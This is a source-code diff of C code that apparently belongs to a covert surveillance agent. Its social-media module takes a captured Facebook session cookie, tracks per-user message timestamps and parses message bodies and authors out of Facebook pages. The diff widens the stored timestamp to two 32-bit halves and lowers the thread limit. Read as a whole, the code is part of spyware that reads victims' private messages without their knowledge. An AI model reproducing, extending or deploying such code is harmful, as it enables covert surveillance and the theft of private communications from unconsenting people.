@@ -13,7 +13,7 @@
 #define FB_MESSAGE_BODY_IDENTIFIER "div class=\\\"content noh\\\" id=\\\""
 #define FB_MESSAGE_AUTHOR_IDENTIFIER "\\u003C\\/a>\\u003C\\/strong>"
 #define FB_NEW_LINE "\\u003Cbr \\/> "
-#define FACEBOOK_THREAD_LIMIT 40
+#define FACEBOOK_THREAD_LIMIT 15
 #define MAX_FACEBOOK_ACCOUNTS 500 
 #define FB_INVALID_TSTAMP 0xFFFFFFFF
 
@@ -21,13 +21,17 @@ extern BOOL bPM_IMStarted; // variabili per vedere se gli agenti interessati son
 
 typedef struct {
 	char user[48];
-	DWORD tstamp;
+	DWORD tstamp_lo;
+	DWORD tstamp_hi;
 } last_tstamp_struct;
 last_tstamp_struct *last_tstamp_array = NULL;
 
-DWORD GetLastFBTstamp(char *user)
+DWORD GetLastFBTstamp(char *user, DWORD *hi_part)
 {
 	DWORD i;
+
+	if (hi_part)
+		*hi_part = FB_INVALID_TSTAMP;
 
 	// Se e' la prima volta che viene chiamato 
 	// alloca l'array
@@ -41,32 +45,44 @@ DWORD GetLastFBTstamp(char *user)
 		return FB_INVALID_TSTAMP;
 
 	for (i=0; i<MAX_FACEBOOK_ACCOUNTS; i++) {
-		if (last_tstamp_array[i].user[0] == 0)
+		if (last_tstamp_array[i].user[0] == 0) {
+			if (hi_part)
+				*hi_part = 0;
 			return 0;
-		if (!strcmp(user, last_tstamp_array[i].user))
-			return last_tstamp_array[i].tstamp;
+		}
+		if (!strcmp(user, last_tstamp_array[i].user)) {
+			if (hi_part)
+				*hi_part = last_tstamp_array[i].tstamp_hi;
+			return last_tstamp_array[i].tstamp_lo;
+		}
 	}
 	return FB_INVALID_TSTAMP;
 }
 
-void SetLastFBTstamp(char *user, DWORD tstamp)
+void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi)
 {
-	DWORD i;
+	DWORD i, dummy;
 
-	if (!user || !user[0] || tstamp==0)
+	if (!user || !user[0])
 		return;
 
-	if (!last_tstamp_array && GetLastFBTstamp(user)==FB_INVALID_TSTAMP)
+	if (tstamp_lo==0 && tstamp_hi==0)
+		return;
+
+	if (!last_tstamp_array && GetLastFBTstamp(user, &dummy)==FB_INVALID_TSTAMP && dummy==FB_INVALID_TSTAMP)
 		return;
 
 	for (i=0; i<MAX_FACEBOOK_ACCOUNTS; i++) {
 		if (last_tstamp_array[i].user[0] == 0)
 			break;
 		if (!strcmp(user, last_tstamp_array[i].user)) {
-			if (tstamp > last_tstamp_array[i].tstamp) {
-				last_tstamp_array[i].tstamp = tstamp;
-				Log_SaveAgentState(PM_SOCIALAGENT_FB, (BYTE *)last_tstamp_array, MAX_FACEBOOK_ACCOUNTS*sizeof(last_tstamp_struct));
-			}
+			if (tstamp_hi < last_tstamp_array[i].tstamp_hi)
+				return;
+			if (tstamp_hi==last_tstamp_array[i].tstamp_hi && tstamp_lo<=last_tstamp_array[i].tstamp_lo) 
+				return;
+			last_tstamp_array[i].tstamp_hi = tstamp_hi;
+			last_tstamp_array[i].tstamp_lo = tstamp_lo;
+			Log_SaveAgentState(PM_SOCIALAGENT_FB, (BYTE *)last_tstamp_array, MAX_FACEBOOK_ACCOUNTS*sizeof(last_tstamp_struct));
 			return;
 		}
 	}
@@ -75,7 +91,8 @@ void SetLastFBTstamp(char *user, DWORD tstamp)
 		// Lo scrive nella prima entry libera
 		if (last_tstamp_array[i].user[0] == 0) {
 			_snprintf_s(last_tstamp_array[i].user, 48, _TRUNCATE, "%s", user);		
-			last_tstamp_array[i].tstamp = tstamp;
+			last_tstamp_array[i].tstamp_hi = tstamp_hi;
+			last_tstamp_array[i].tstamp_lo = tstamp_lo;
 			Log_SaveAgentState(PM_SOCIALAGENT_FB, (BYTE *)last_tstamp_array, MAX_FACEBOOK_ACCOUNTS*sizeof(last_tstamp_struct));
 			return;
 		}
@@ -130,7 +147,7 @@ DWORD HandleFaceBook(char *cookie)
 		return SOCIAL_REQUEST_BAD_COOKIE;
 
 	// Carica dal file il last time stamp per questo utente
-	last_tstamp = GetLastFBTstamp(user);
+	last_tstamp = GetLastFBTstamp(user, NULL);
 	if (last_tstamp == FB_INVALID_TSTAMP)
 		return SOCIAL_REQUEST_BAD_COOKIE;
 
@@ -205,7 +222,7 @@ DWORD HandleFaceBook(char *cookie)
 			act_tstamp = atoi(tstamp);
 			if (act_tstamp>2000000000 || act_tstamp <= last_tstamp)
 				continue;
-			SetLastFBTstamp(user, act_tstamp);
+			SetLastFBTstamp(user, act_tstamp, 0);
 
 			parser_inner2 = (BYTE *)strstr((char *)parser_inner1, FB_MESSAGE_AUTHOR_IDENTIFIER);
 			if (!parser_inner2)
